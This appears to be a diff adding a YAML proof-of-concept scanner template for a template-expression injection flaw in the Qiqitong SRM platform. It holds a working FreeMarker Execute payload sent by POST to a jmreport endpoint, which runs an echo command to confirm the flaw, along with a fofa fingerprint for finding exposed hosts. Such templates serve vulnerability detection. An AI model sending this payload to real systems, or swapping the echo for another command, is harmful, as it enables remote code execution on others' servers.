@@ -1,0 +1,21 @@
+id: poc-yaml-qqt-internet-solutions-els-expression-injection
+info:
+  name: 企企通互联网解决方案 els 表达式注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 企企通互联网解决方案
+  fofa: body="welcome-srm-wrap"
+variables:
+  t1: md5(random_int(1000,10000))
+requests:
+- method: POST
+  path: /els/report/jmreport/queryFieldBySql
+  headers:
+    Content-Type: application/json
+  data: '{"dbSource": "", "sql":"select ''result:<#assign ex=\"freemarker.template.utility.Execute\"?new()>
+    ${ex(\"echo {{.t1}}\") }''"} '
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"fieldName\":")
+    && contains(body,"result:") && contains(body,t1) && (contains(content_type,"application/json")
+    || contains(content_type,"text/html"))
+transport: http
